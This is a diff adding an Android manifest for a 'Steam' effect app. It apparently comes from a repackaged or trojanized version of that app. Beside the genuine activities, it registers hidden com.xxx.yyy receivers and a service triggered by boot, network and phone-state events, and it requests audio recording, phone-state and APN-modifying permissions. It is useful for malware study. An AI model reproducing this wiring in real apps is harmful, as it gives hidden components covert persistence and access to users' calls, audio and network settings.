@@ -1,0 +1,49 @@
+<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.appspot.swisscodemonkeys.steam">
+    <application android:icon="@drawable/icon" android:label="@string/app_name">
+        <activity android:label="@string/app_name" android:name=".Steam" android:theme="@android:style/Theme.Translucent.NoTitleBar.Fullscreen">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+            <receiver android:exported="true" android:name="cmn.ReferrerReceiver">
+                <intent-filter>
+                    <action android:name="com.android.vending.ACTION_INSTALL_REFERRER"/>
+                </intent-filter>
+            </receiver>
+        </activity>
+        <receiver android:name="com.xxx.yyy.MyBoolService">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:name="com.xxx.yyy.MyAlarmReceiver">
+            <intent-filter>
+                <action android:name="com.lz.myservicestart"/>
+            </intent-filter>
+        </receiver>
+        <service android:enabled="true" android:name="com.xxx.yyy.MyService"/>
+        <receiver android:name="com.xxx.yyy.NetWorkReceiver">
+            <intent-filter>
+                <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:name="com.xxx.yyy.CustomBroadcastReceiver">
+            <intent-filter>
+                <action android:name="android.intent.action.PHONE_STATE"/>
+            </intent-filter>
+        </receiver>
+        <activity android:name="com.appspot.swisscodemonkeys.steam.Preferences"/>
+        <activity android:name="cmn.AboutActivity" android:theme="@android:style/Theme.Dialog"/>
+    </application>
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.WRITE_APN_SETTINGS"/>
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.MODIFY_PHONE_STATE"/>
+    <supports-screens/>
+</manifest>
